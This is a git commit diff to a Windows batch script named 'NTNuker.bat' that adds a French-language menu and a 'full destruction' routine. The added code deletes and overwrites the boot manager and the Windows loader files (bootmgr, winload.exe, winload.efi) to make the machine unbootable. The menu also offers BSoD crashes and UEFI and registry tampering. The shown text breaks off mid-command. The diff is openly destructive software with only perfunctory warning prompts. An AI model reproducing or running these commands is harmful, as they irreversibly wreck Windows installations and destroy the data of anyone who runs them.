7882295a46dae80be3e0c81f7ab044b0966e6b8b
lyonstackdev <74206040+lyonstackdev@users.noreply.github.com>
2020-11-28 10:53:53 +0100

    Added locales and Full nuke

--- NTNuker.bat
+++ NTNuker.bat
@@ -17,4 +17,41 @@ cls
 goto :menu_en
 )
 
+:: Français/French
+:menu_fr
+echo [X] Destruction totale
+echo.
+echo [A] Crash BSoD (CRITICAL_PROCESS_DIED)
+echo [B] Crash Win32
+echo [C] Erreur infinie (Requiert Windows 7 ou plus)
+echo [D] Modifier UEFI (Requiert firmware compatible UEFI)
+echo [E] Modifier registre
+choice /c:ABCDEFGHIJKLMNOPQRSTUVW /n
+
+:fulldestroy_fr
+cls
+color 0c
+echo Etes vous sur de continuer ? Celle-ci rendera l'ordinateur inutilisable
+pause
+cls
+echo Dernier avertissement : Si vous continuer, Windows sera inutilisable
+pause
+cls
+timeout /t 2 /nobreak>nul
+set sd=%systemdrive%
+set sw=%WinDir%\System32
+::
+del %sd%\bootmgr /s /f /q
+echo Nuked > %sd%\bootmgr 
+echo Corrompu: Boot Manager
+::
+del %sw%\winload.exe /s /f /q
+echo Nuked > %sw%\winload.exe
+echo Corrompu: Windows Loader
+::
+del %sw%\winload.efi /s /f /q
+echo Nuked > %sw%\winload.efi
+echo Corrompu: Windows Loader (EFI)
+::
+del 
 
